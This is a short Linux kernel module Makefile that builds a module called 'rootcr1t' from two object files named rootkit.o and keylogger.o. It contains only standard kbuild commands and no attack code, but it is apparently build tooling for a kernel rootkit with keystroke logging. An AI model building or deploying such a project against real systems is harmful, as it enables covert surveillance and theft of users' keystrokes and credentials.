obj-m += rootcr1t.o
rootcr1t-objs := rootkit.o keylogger.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean